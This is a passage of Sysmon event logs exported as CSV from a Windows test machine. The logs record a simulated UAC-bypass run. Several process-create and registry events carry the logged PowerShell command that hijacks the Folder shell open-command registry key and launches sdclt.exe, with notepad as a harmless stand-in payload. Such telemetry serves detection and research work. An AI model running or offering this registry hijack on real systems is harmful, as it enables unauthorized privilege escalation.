CommandLine: consent.exe 7068 300 0000024951025300

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {fda94052-b676-658c-ae00-000000000b00}

ParentProcessId: 7068

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\sdclt.exe"" ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® Windows Backup,,,,,,,1,9524,,10.0.22621.1992 (WinBuild.160101.0800),"MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B",C:\Windows\System32\sdclt.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:52.972

ProcessGuid: {fda94052-3b24-658d-a002-000000000b00}

ProcessId: 3920

Image: C:\Windows\System32\sdclt.exe

FileVersion: 10.0.22621.1992 (WinBuild.160101.0800)

Description: Microsoft® Windows Backup

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: sdclt.exe

CommandLine: ""C:\Windows\system32\sdclt.exe"" 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B

ParentProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ParentProcessId: 1064

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}

ParentUser: WINDEV2309EVAL\User",Info,sdclt.exe,"""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3b23-658d-9e02-000000000b00},1064,WINDEV2309EVAL\User,{fda94052-3b24-658d-a002-000000000b00},7044,3920,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:52.9826142Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:52.972,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:52.9826142Z""/>
      <EventRecordID>9524</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:52.972</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b24-658d-a002-000000000b00}</Data>
      <Data Name=""ProcessId"">3920</Data>
      <Data Name=""Image"">C:\Windows\System32\sdclt.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1992 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; Windows Backup</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">sdclt.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\sdclt.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b23-658d-9e02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1064</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:52.972

ProcessGuid: {fda94052-3b24-658d-a002-000000000b00}

ProcessId: 3920

Image: C:\Windows\System32\sdclt.exe

FileVersion: 10.0.22621.1992 (WinBuild.160101.0800)

Description: Microsoft&#174; Windows Backup

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: sdclt.exe

CommandLine: ""C:\Windows\system32\sdclt.exe"" 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B

ParentProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ParentProcessId: 1064

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,(Empty),13,9523,SetValue,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Registry value set:

RuleName: T1042

EventType: SetValue

UtcTime: 2023-12-28 09:08:52.889

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetObject: HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\DelegateExecute

Details: (Empty)

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3b23-658d-9e02-000000000b00},7044,1064,,,,,,"
      ",T1042,,,,,,2023-12-28T09:08:52.8989347Z,,HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\DelegateExecute,Registry value set (rule: RegistryEvent),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:52.889,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:52.8989347Z""/>
      <EventRecordID>9523</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1042</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:52.889</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9e02-000000000b00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetObject"">HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\DelegateExecute</Data>
      <Data Name=""Details"">(Empty)</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Registry value set:

RuleName: T1042

EventType: SetValue

UtcTime: 2023-12-28 09:08:52.889

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetObject: HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\DelegateExecute

Details: (Empty)

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Registry value set (rule: RegistryEvent)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,cmd.exe /c notepad.exe,13,9522,SetValue,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Registry value set:

RuleName: T1042

EventType: SetValue

UtcTime: 2023-12-28 09:08:52.586

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetObject: HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\(Default)

Details: cmd.exe /c notepad.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3b23-658d-9e02-000000000b00},7044,1064,,,,,,"
      ",T1042,,,,,,2023-12-28T09:08:52.5910537Z,,HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\(Default),Registry value set (rule: RegistryEvent),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:52.586,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:52.5910537Z""/>
      <EventRecordID>9522</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1042</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:52.586</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9e02-000000000b00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetObject"">HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\(Default)</Data>
      <Data Name=""Details"">cmd.exe /c notepad.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Registry value set:

RuleName: T1042

EventType: SetValue

UtcTime: 2023-12-28 09:08:52.586

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetObject: HKU\S-1-5-21-3832996301-1047793030-1114040027-1000_Classes\Folder\shell\open\command\(Default)

Details: cmd.exe /c notepad.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Registry value set (rule: RegistryEvent)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:08:51.583,,,,,,,,,11,9521,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:08:51.583

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gk142k1h.dde.ps1

CreationUtcTime: 2023-12-28 09:08:51.583

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3b23-658d-9e02-000000000b00},7044,1064,,,,,,"
      ",-,,,,,,2023-12-28T09:08:51.5928053Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gk142k1h.dde.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:51.583,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.5928053Z""/>
      <EventRecordID>9521</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.583</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9e02-000000000b00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gk142k1h.dde.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:08:51.583</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:08:51.583

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gk142k1h.dde.ps1

CreationUtcTime: 2023-12-28 09:08:51.583

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,10.0.22621.1,13,9520,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,Information,,,"Registry value set:

RuleName: InvDB-Ver

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\BinProductVersion

Details: 10.0.22621.1

User: NT AUTHORITY\SYSTEM",Info,,,,,,,{fda94052-34f3-658d-4e00-000000000b00},7044,3628,,,,,,"
      ",InvDB-Ver,,,,,,2023-12-28T09:08:51.5233312Z,,\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\BinProductVersion,Registry value set (rule: RegistryEvent),,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:08:51.518,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.5233312Z""/>
      <EventRecordID>9520</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-Ver</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.518</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f3-658d-4e00-000000000b00}</Data>
      <Data Name=""ProcessId"">3628</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\BinProductVersion</Data>
      <Data Name=""Details"">10.0.22621.1</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Registry value set:

RuleName: InvDB-Ver

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\BinProductVersion

Details: 10.0.22621.1

User: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Registry value set (rule: RegistryEvent)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,11/02/2033 22:40:54,13,9519,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,Information,,,"Registry value set:

RuleName: InvDB-CompileTimeClaim

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LinkDate

Details: 11/02/2033 22:40:54

User: NT AUTHORITY\SYSTEM",Info,,,,,,,{fda94052-34f3-658d-4e00-000000000b00},7044,3628,,,,,,"
      ",InvDB-CompileTimeClaim,,,,,,2023-12-28T09:08:51.5232729Z,,\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LinkDate,Registry value set (rule: RegistryEvent),,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:08:51.518,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.5232729Z""/>
      <EventRecordID>9519</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-CompileTimeClaim</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.518</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f3-658d-4e00-000000000b00}</Data>
      <Data Name=""ProcessId"">3628</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LinkDate</Data>
      <Data Name=""Details"">11/02/2033 22:40:54</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Registry value set:

RuleName: InvDB-CompileTimeClaim

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LinkDate

Details: 11/02/2033 22:40:54

User: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Registry value set (rule: RegistryEvent)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
